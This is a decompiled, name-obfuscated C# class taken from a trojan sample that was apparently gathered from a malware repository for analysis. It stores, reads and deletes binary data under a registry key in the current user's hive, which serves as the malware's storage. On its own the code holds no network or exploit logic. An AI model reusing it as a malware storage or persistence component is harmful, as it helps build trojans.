// Decompiled with JetBrains decompiler
// Type: xjXkkjtlfmw.bJPRZcMFonVTZk
// Assembly: deinvater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89B491E0-9EDA-4D26-ADB9-208707ED33ED
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-561b48f813af5f638c5f305d21a716998cce9e0ce1ea3374fd118cec5f725885.exe

using JYUfEoWFNtx;
using Microsoft.Win32;
using System;
using zOUYjcXSyH;

namespace xjXkkjtlfmw
{
  public static class bJPRZcMFonVTZk
  {
    private static readonly string RZjBGrjJwxQruG = "Software\\" + FBcKnoLoUsnvl.RYMjzLvZvdxzD;

    public static bool AAzFcBaJOAzid(string vBFsVPekOgaE, byte[] UThBdrRaWbol)
    {
      try
      {
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey(bJPRZcMFonVTZk.RZjBGrjJwxQruG, RegistryKeyPermissionCheck.ReadWriteSubTree))
        {
          subKey.SetValue(vBFsVPekOgaE, (object) UThBdrRaWbol, RegistryValueKind.Binary);
          return true;
        }
      }
      catch (Exception ex)
      {
        MvfZagPRHVeGhz.oeIXOqnVSQX(ex.Message);
      }
      return false;
    }

    public static byte[] mNkEVxHqhPh(string rPyJEJsMIAekffLG)
    {
      try
      {
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey(bJPRZcMFonVTZk.RZjBGrjJwxQruG))
          return (byte[]) subKey.GetValue(rPyJEJsMIAekffLG);
      }
      catch (Exception ex)
      {
        MvfZagPRHVeGhz.oeIXOqnVSQX(ex.Message);
      }
      return (byte[]) null;
    }

    public static bool oRHEptJGXDvgBON(string GcrdtENSOWU)
    {
      try
      {
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey(bJPRZcMFonVTZk.RZjBGrjJwxQruG))
        {
          subKey.DeleteValue(GcrdtENSOWU);
          return true;
        }
      }
      catch (Exception ex)
      {
        MvfZagPRHVeGhz.oeIXOqnVSQX(ex.Message);
      }
      return false;
    }

    public static bool NIAGiBbAXpvcp()
    {
      try
      {
        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("", true))
        {
          registryKey.DeleteSubKeyTree(bJPRZcMFonVTZk.RZjBGrjJwxQruG);
          return true;
        }
      }
      catch (Exception ex)
      {
        MvfZagPRHVeGhz.oeIXOqnVSQX(ex.Message);
      }
      return false;
    }
  }
}
